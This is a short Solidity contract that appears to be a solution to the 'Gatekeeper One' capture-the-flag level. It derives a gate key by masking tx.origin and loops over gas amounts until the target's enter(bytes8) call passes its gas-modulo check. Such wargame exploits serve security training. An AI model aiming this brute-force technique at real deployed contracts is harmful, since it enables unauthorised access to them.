// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract GatekeeperOneAttack{

    function attack(address target) external{
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(target).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}